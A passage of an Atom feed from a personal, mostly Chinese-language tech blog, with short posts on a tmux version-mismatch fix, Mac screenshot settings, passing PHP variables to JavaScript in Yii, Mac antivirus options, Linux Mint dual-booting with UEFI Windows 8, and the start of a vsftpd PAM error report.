&lt;li&gt;Drag &amp;amp; Drop  &lt;/li&gt;
&lt;li&gt;Access / feature restrictions  &lt;/li&gt;
&lt;li&gt;Protected areas via frontend login  &lt;/li&gt;
&lt;li&gt;High-traffic - intensive caching  &lt;ul&gt;
&lt;li&gt;File system, Database, memory, NoSQL  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Output fully configurable  &lt;ul&gt;
&lt;li&gt;Website, PDF, Image, XML Interface, ...  &lt;/li&gt;
&lt;li&gt;Single source publishing  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;DB-record relations  &lt;ul&gt;
&lt;li&gt;1:1, 1:n, n:m  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Valid HTML5 output  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Features via extensions  &lt;ul&gt;
&lt;li&gt;Press / News releases  &lt;/li&gt;
&lt;li&gt;Newsletter  &lt;/li&gt;
&lt;li&gt;Search engine optimization  &lt;/li&gt;
&lt;li&gt;Image galleries  &lt;/li&gt;
&lt;li&gt;Readable URLs  &lt;/li&gt;
&lt;li&gt;Address database  &lt;/li&gt;
&lt;li&gt;Forum  &lt;/li&gt;
&lt;li&gt;Frontend user registration  &lt;/li&gt;
&lt;li&gt;Mail forms  &lt;/li&gt;
&lt;li&gt;FAQ  &lt;/li&gt;
&lt;li&gt;Online-Shop  &lt;/li&gt;
&lt;li&gt;Google Maps  &lt;/li&gt;
&lt;li&gt;Search  &lt;/li&gt;
&lt;li&gt;Web Analytics  &lt;/li&gt;
&lt;li&gt;Developer support  &lt;ul&gt;
&lt;li&gt;Extension Builder  &lt;ul&gt;
&lt;li&gt;You can use UML diagram to generate Extensions  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Protocols  &lt;/li&gt;
&lt;li&gt;Libraries  &lt;/li&gt;
&lt;li&gt;PHP unit integration  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Current Work  &lt;ul&gt;
&lt;li&gt;Code cleanup with version 4.7 (4.2012)  &lt;ul&gt;
&lt;li&gt;Many extensions known to not work without rework.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Rebased for version 6.0 (11.2012)  &lt;ul&gt;
&lt;li&gt;Partly breaks backward compatibility  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Why?  &lt;ul&gt;
&lt;li&gt;For code refactoring  &lt;/li&gt;
&lt;li&gt;Removed tons of legacy code  &lt;/li&gt;
&lt;li&gt;Cleanup outdated file structure, class and function naming  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.sitepoint.com/autoloading-and-the-psr-0-standard/"&gt;PSR-0&lt;/a&gt; conformity  &lt;/li&gt;
&lt;li&gt;Replace prototype with jQuery  &lt;/li&gt;
&lt;li&gt;Use new "Extbase" framework in backend as well  &lt;/li&gt;
&lt;li&gt;Final goal: merge in Flow framework -&amp;gt; product interoperability  &lt;/li&gt;
&lt;li&gt;Backend layout / usability enhancements  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Appendix&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://code.google.com/p/gource/"&gt;gource - software version control visualization&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="PHP"></category><category term="Open Source"></category><category term="CMS"></category><category term="TYPO3"></category></entry><entry><title>Protocol version mismatch error in tmux</title><link href="https://blog.m157q.tw/posts/2014/02/27/protocol-version-mismatch-error-in-tmux/" rel="alternate"></link><published>2015-10-26T13:28:00+08:00</published><updated>2015-10-26T13:28:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-02-27:posts/2014/02/27/protocol-version-mismatch-error-in-tmux/</id><summary type="html">&lt;p&gt;今天打 &lt;code&gt;$ tmux attach&lt;/code&gt; 之後  &lt;/p&gt;
&lt;p&gt;竟然噴了錯誤訊息 &lt;code&gt;protocol version mismatch (client 8, server 7)&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;以前完全沒看過  &lt;/p&gt;
&lt;p&gt;只好丟去 Google  &lt;/p&gt;
&lt;p&gt;第一個解法是 &lt;strong&gt;強行 attach tmux&lt;/strong&gt;  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ pgrep tmux  
$ /proc/&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;tmuxpid&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;/exe attach  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;但執行後發現會噴 Permission Denied. 失敗  &lt;/p&gt;
&lt;p&gt;第二個解法是 &lt;strong&gt;把 tmux 砍掉重開&lt;/strong&gt;  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ pgrep tmux  
$ &lt;span class="nb"&gt;kill&lt;/span&gt; &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;tmuxpid&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;然後重開 tmux 就行了  &lt;/p&gt;
&lt;hr /&gt;
&lt;h4&gt;References&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://bugs.launchpad.net/byobu/+bug/1174724"&gt;protocol version mismatch (client 7, server 6)&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://plus.google.com/110139418387705691470/posts/BebrBSXMkBp"&gt;https://plus.google.com/110139418387705691470/posts/BebrBSXMkBp&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.longwin.com.tw/2013/11/tmux-protocol-version-mismatch-fix-2013/"&gt;Tmux 出現 protocol version mismatch 解法&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="CLI"></category><category term="tmux"></category></entry><entry><title>Hootsuite - Social Media Management</title><link href="https://blog.m157q.tw/posts/2014/02/27/hootsuite-social-media-management/" rel="alternate"></link><published>2015-10-26T15:13:00+08:00</published><updated>2015-10-26T15:13:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-02-27:posts/2014/02/27/hootsuite-social-media-management/</id><summary type="html">&lt;p&gt;&lt;a href="https://hootsuite.com/"&gt;Social Media Management Dashboard - Hootsuite&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;聽說可以整合許多 SMS 一次發布訊息  &lt;/p&gt;
&lt;p&gt;然後介面長得有點像 Trello  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;2015.10.26 後記&lt;/h2&gt;
&lt;p&gt;當時是因為 Apua 在 PyCon 需要在 SMS 上面發文宣得知 &lt;code&gt;Hootsuite&lt;/code&gt;&lt;br /&gt;
最近得知另外一個也在做相同功能的網站是 &lt;a href="https://buffer.com/"&gt;Buffer - A Smarter Way to Share on Social Media&lt;/a&gt;  &lt;/p&gt;</summary><category term="SMS"></category><category term="Hootsuite"></category></entry><entry><title>Interesting JavaScript online encoder</title><link href="https://blog.m157q.tw/posts/2014/02/27/interesting-javascript-online-encoder/" rel="alternate"></link><published>2015-10-26T14:02:00+08:00</published><updated>2015-10-26T14:02:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-02-27:posts/2014/02/27/interesting-javascript-online-encoder/</id><summary type="html">&lt;ul&gt;
&lt;li&gt;&lt;a href="http://utf-8.jp/public/jjencode.html"&gt;jjencode&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://utf-8.jp/public/aaencode.html"&gt;aaencode&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="JavaScript"></category></entry><entry><title>Laravel 4 Traditional Chinese Tutorial</title><link href="https://blog.m157q.tw/posts/2014/02/27/laravel-4-traditional-chinese-tutorial/" rel="alternate"></link><published>2015-10-27T22:40:00+08:00</published><updated>2015-10-27T22:40:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-02-27:posts/2014/02/27/laravel-4-traditional-chinese-tutorial/</id><summary type="html">&lt;p&gt;這個超級年輕又火紅的 PHP Framework 竟然有繁體中文的教學  &lt;/p&gt;
&lt;p&gt;身邊有用過的好像都說還不錯  &lt;/p&gt;
&lt;p&gt;聽說是 RoR like ?  &lt;/p&gt;
&lt;p&gt;稍微瞄了一下 好像還沒看到非常吸引我的地方  &lt;/p&gt;
&lt;p&gt;之後再找時間繼續看  &lt;/p&gt;
&lt;p&gt;&lt;a href="http://kejyun.github.io/Laravel-4-Documentation-Traditional-Chinese/docs/introduction/"&gt;Laravel 4 中文文件&lt;/a&gt;  &lt;/p&gt;</summary><category term="Web"></category><category term="PHP"></category><category term="Laravel"></category><category term="framework"></category></entry><entry><title>修改 Mac 的截圖儲存位置及格式</title><link href="https://blog.m157q.tw/posts/2014/02/27/change-the-default-screenshot-saving-folder-and-format-on-mac/" rel="alternate"></link><published>2014-02-27T14:08:00+08:00</published><updated>2014-02-27T14:08:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-02-27:posts/2014/02/27/change-the-default-screenshot-saving-folder-and-format-on-mac/</id><summary type="html">&lt;ul&gt;
&lt;li&gt;修改內建截圖的儲存位置  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;$ defaults write com.apple.screencapture location ${directory}&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ killall SystemUIServer&lt;/code&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;ul&gt;
&lt;li&gt;修改內建截圖的儲存格式  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;$ defaults write com.apple.screencapture type $type&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;type 有 4 種可選:  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;png  &lt;/li&gt;
&lt;li&gt;jpg  &lt;/li&gt;
&lt;li&gt;gif  &lt;/li&gt;
&lt;li&gt;pdf  &lt;/li&gt;
&lt;/ol&gt;
&lt;hr /&gt;
&lt;h4&gt;Reference&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://my.eoe.cn/sisuer/archive/4711.html"&gt;【Mac技巧】修改Mac系统电脑快捷键截图默认保存路径及修改图片类型&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Mac"></category><category term="Screenshot"></category></entry><entry><title>Pass PHP Variables to JavaScript in Yii</title><link href="https://blog.m157q.tw/posts/2014/02/27/pass-php-variables-to-javascript-in-yii/" rel="alternate"></link><published>2015-10-27T22:40:00+08:00</published><updated>2015-10-27T22:40:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-02-27:posts/2014/02/27/pass-php-variables-to-javascript-in-yii/</id><summary type="html">&lt;h2&gt;Preface&lt;/h2&gt;
&lt;p&gt;因為網站需求 想找看看有沒有可以把 PHP 中的變數傳給 JavaScript 使用的方法  &lt;/p&gt;
&lt;p&gt;主要是因為 URL 不想像之前一樣是寫死在 JavaScript 裡面  &lt;/p&gt;
&lt;p&gt;不然之後 URL routing 又改的話 又得重新修改 實在很麻煩  &lt;/p&gt;
&lt;p&gt;想用 &lt;code&gt;Yii::app()-&amp;gt;createAbsoluteUrl('');&lt;/code&gt; 生成該頁面的網址之後  &lt;/p&gt;
&lt;p&gt;再丟給 JavaScript  &lt;/p&gt;
&lt;p&gt;這樣就不用把網址寫死在裡面  &lt;/p&gt;
&lt;p&gt;其實找了有點久 好像沒找比較好的解法  &lt;/p&gt;
&lt;h2&gt;Solution&lt;/h2&gt;
&lt;p&gt;所以最後用了 &lt;a href="http://stackoverflow.com/questions/8912548/in-yii-pass-php-variables-to-javascript"&gt;stackoverflow 上的這篇&lt;/a&gt; 中最底下的回覆  &lt;/p&gt;
&lt;p&gt;但裡面的寫法有一點點小錯誤  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="x"&gt;Yii::app()-&amp;gt;clientScript-&amp;gt;registerScript(&amp;quot;myVarList&amp;quot;,  &lt;/span&gt;
&lt;span class="x"&gt;    &amp;#39;myVarList = jQuery.parseJSON(&amp;#39;.CJSON::encode($myVarList).&amp;#39;);&amp;#39;  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;小括號的內層必須再多一對單引號  &lt;/p&gt;
&lt;p&gt;不然 &lt;a href="https://api.jquery.com/jQuery.parseJSON/"&gt;jQuery.parseJSON&lt;/a&gt; 會出錯  &lt;/p&gt;
&lt;p&gt;所以最後寫的 Code 長這樣  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;  
&lt;span class="nv"&gt;$myVar&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;url&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;Yii&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="na"&gt;app&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="na"&gt;createAbsoluteUrl&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$this&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="na"&gt;module&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="na"&gt;id&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/default/list/json/1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)];&lt;/span&gt;  
&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;  &lt;/span&gt;

&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;  
&lt;span class="nx"&gt;Yii&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="na"&gt;app&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="na"&gt;clientScript&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="na"&gt;registerScript&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;myVar = jQuery.parseJSON(&amp;#39;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;CJSON&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="na"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$myVar&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;#39;);&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;EOD&lt;/span&gt;  
&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;updateList&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;name&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="p"&gt;{&lt;/span&gt;  
    &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;#company-list&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;html&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;#loading-tmpl&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;text&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;  
    &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;getJSON&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;myVar&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;url&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;name&lt;/span&gt; &lt;span class="o"&gt;!==&lt;/span&gt; &lt;span class="k"&gt;null&lt;/span&gt; &lt;span class="o"&gt;?&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/name/&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;name&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;  
        &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;#company-list&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="k"&gt;empty&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;  
        &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;#company-tmpl&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;tmpl&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;appendTo&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;#company-list&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;  
    &lt;span class="p"&gt;});&lt;/span&gt;  
&lt;span class="p"&gt;}&lt;/span&gt;  

&lt;span class="o"&gt;...&lt;/span&gt;  
&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;在 JavaScript 中，可以透過 &lt;code&gt;myVar.url&lt;/code&gt; 順利拿到 URL  &lt;/p&gt;
&lt;h2&gt;Appendix&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="x"&gt;&amp;lt;&amp;lt;&amp;lt;EOD  &lt;/span&gt;
&lt;span class="x"&gt;...  &lt;/span&gt;
&lt;span class="x"&gt;EOD;  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;此種寫法在 PHP 中稱為 &lt;code&gt;HEREDOC&lt;/code&gt;  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;A third way to delimit strings is the heredoc syntax: &amp;lt;&amp;lt;&amp;lt;.&lt;br /&gt;
After this operator, an identifier is provided, then a newline.&lt;br /&gt;
The string itself follows, and then the same identifier again to close the quotation.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;詳見官方說明 &lt;a href="http://www.php.net/manual/en/language.types.string.php#language.types.string.syntax.heredoc"&gt;PHP - HEREDOC syntax&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;References&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/8912548/in-yii-pass-php-variables-to-javascript" title="In Yii, pass PHP variables to JavaScript"&gt;In Yii, pass PHP variables to JavaScript&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://api.jquery.com/jQuery.parseJSON/"&gt;jQuery.parseJSON&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://api.jquery.com/jquery.getjson/"&gt;jQuery.getJSON&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.yiiframework.com/doc/api/1.1/CClientScript#registerScript-detail"&gt;Yii - CClientScript &lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.yiiframework.com/doc/api/1.1/CJSON#encode-detail"&gt;Yii - CJSON&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/6924193/what-is-the-use-of-eod-in-php"&gt;What is the use of &amp;lt;&amp;lt;&amp;lt;EOD in PHP?&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Web"></category><category term="JavaScript"></category><category term="PHP"></category><category term="jQuery"></category><category term="Yii"></category></entry><entry><title>Antivirus software for Mac</title><link href="https://blog.m157q.tw/posts/2014/02/27/antivirus-software-for-mac/" rel="alternate"></link><published>2014-02-27T13:12:00+08:00</published><updated>2014-02-27T13:12:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-02-27:posts/2014/02/27/antivirus-software-for-mac/</id><summary type="html">&lt;p&gt;Many people believe that Mac won't get virus.&lt;br /&gt;
While the Mac users are growing more and more nowadays,&lt;br /&gt;
Crackers won't give up the chances to attack the Mac computers.&lt;br /&gt;
So, we better install a antivirus software to prevent the attack from those bad guys.  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="http://www.clamxav.com/"&gt;ClamXav&lt;/a&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ClamXav is a free virus scanner for Mac OS X. It uses the very popular ClamAV open source antivirus engine as a back end and has the ability to detect both Windows and Mac threats.  &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Only scan for virus and need manually start&lt;/strong&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="http://www.sophos.com/en-us/products/free-tools/sophos-antivirus-for-mac-home-edition.aspx"&gt;SOPHOS - Antivirus for Mac Home Editon&lt;/a&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;A security suite for Mac including some features.\  &lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Not only scan for virus&lt;/strong&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;</summary><category term="Mac"></category><category term="Antivirus"></category></entry><entry><title>Install Linux Mint 16 in Dual Boot with Win8 on Notebook with UEFI</title><link href="https://blog.m157q.tw/posts/2014/02/21/install-linux-mint-16-in-dual-boot-with-win8-on-notebook-with-uefi/" rel="alternate"></link><published>2015-10-26T13:53:00+08:00</published><updated>2015-10-26T13:53:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-02-21:posts/2014/02/21/install-linux-mint-16-in-dual-boot-with-win8-on-notebook-with-uefi/</id><summary type="html">&lt;p&gt;有人不會裝，又剛好自己沒有在 UEFI 系統的 Win8 筆電上灌 Linux 的經驗，就想說來試試看。&lt;br /&gt;
(之前嘗試要幫人把 UEFI 系統的 Win8 灌成 Win7 失敗後，就覺得 UEFI + Win8 很難搞)  &lt;/p&gt;
&lt;p&gt;這次灌完後仍然覺得很討厭，所以紀錄一下方法。  &lt;/p&gt;
&lt;p&gt;前面一直到 LiveUSB 成功開啟的部份應該其他 Linux Distribution 的安裝也適用吧？  &lt;/p&gt;
&lt;p&gt;因為沒試過，所以只是猜測。  &lt;/p&gt;
&lt;p&gt;以下簡要紀錄過程  &lt;/p&gt;
&lt;hr /&gt;
&lt;ol&gt;
&lt;li&gt;到 &lt;a href="http://www.linuxmint.com/"&gt;Mint 官方網站&lt;/a&gt; 下載 Image 檔  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.linuxmint.com/download.php"&gt;Download Linux Mint Latest Version&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;自行選擇 Window Manager 和符合的位元版本  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;將 .iso 檔製作成 LiveUSB  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;清出一個 Unallocated 的磁區給 Mint 安裝用  &lt;/li&gt;
&lt;li&gt;插入 Mint16 的 LiveUSB，要讓 Win8 讀到，待會要進 UEFI 調整開機順序  &lt;/li&gt;
&lt;li&gt;把 Windows 的 Fast Boot 關掉  &lt;ul&gt;
&lt;li&gt;Fast Boot 預設載入 Windows Kernel，如果沒關掉的話，用 LiveUSB 開機，進到 GRUB 選擇 Mint 開機後就會進入黑屏。  &lt;/li&gt;
&lt;li&gt;步驟  &lt;ol&gt;
&lt;li&gt;點選 Win8 桌面側欄的「設定」  &lt;/li&gt;
&lt;li&gt;點選最下方的「變更電腦設定」  &lt;/li&gt;
&lt;li&gt;點選左方側欄的「一般」  &lt;/li&gt;
&lt;li&gt;右方側欄拉到最下方，點選進階啟動中的「立即重新啟動」  &lt;/li&gt;
&lt;li&gt;出現畫面後，選擇「疑難排解」  &lt;/li&gt;
&lt;li&gt;點選「進階選項」  &lt;/li&gt;
&lt;li&gt;點選「UEFI韌體設定」  &lt;/li&gt;
&lt;li&gt;點選「重新啟動」，之後電腦會重開機進入 UEFI 設定介面  &lt;/li&gt;
&lt;li&gt;Boot 中的 Fast Boot 用空白鍵更改為 Disabled  &lt;/li&gt;
&lt;li&gt;將底下的 Boot Options Priorites 調整為 LiveUSB 為第一個  &lt;/li&gt;
&lt;li&gt;按 F10 Save &amp;amp; Exit -&amp;gt; Yes  &lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;重開機後，應該就會進入 LiveUSB 中  &lt;/li&gt;
&lt;li&gt;其他就參考 References 部分的第一篇文章，照著 Mint 的安裝流程安裝  &lt;ul&gt;
&lt;li&gt;切 /, /swap, /home  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;hr /&gt;
&lt;h2&gt;Refereneces&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://itsfoss.com/guide-install-linux-mint-16-dual-boot-windows/"&gt;Guide To Install Linux Mint 16 In Dual Boot With Windows&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://forums.linuxmint.com/viewtopic.php?f=46&amp;amp;t=155164"&gt;Black screen when boot from liveUSB to install Linux Mint 16&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;(dead) &lt;a href="http://forums.linuxmint.com/viewtopic.php?f=46&amp;amp;t=159972"&gt;Booting Linux Mint 16 from Live USB fails in initramfs&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://forums.linuxmint.com/viewtopic.php?f=46&amp;amp;t=153074"&gt;《SOLVED》Black screen before installation, Mint 16&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Linux"></category><category term="Linux Mint"></category><category term="Win8"></category><category term="UEFI"></category><category term="Dual Boot"></category></entry><entry><title>vsftpd virtual user broken after upgrade pam from 1.1.8-2 to 1.1.8-3 in Arch Linux</title><link href="https://blog.m157q.tw/posts/2014/02/21/vsftpd-virtual-user-broken-after-upgrade-pam-from-1-1-8-2-to-1-1-8-3-in-arch-linux/" rel="alternate"></link><published>2015-10-27T13:14:00+08:00</published><updated>2015-10-27T13:14:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-02-21:posts/2014/02/21/vsftpd-virtual-user-broken-after-upgrade-pam-from-1-1-8-2-to-1-1-8-3-in-arch-linux/</id><summary type="html">&lt;p&gt;pam 升到 1.1.8-3 後，vsftpd 的 virtual user 功能就爛掉了  &lt;/p&gt;
&lt;p&gt;檢查了 &lt;code&gt;auth.log&lt;/code&gt; 以後，發現噴了  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Feb 20 00:35:49 localhost vsftpd:  
PAM unable to dlopen(/usr/lib/security/pam_userdb.so):  
/usr/lib/security/pam_userdb.so: cannot open shared object file:  
No such file or directory  
&lt;/pre&gt;&lt;/div&gt;


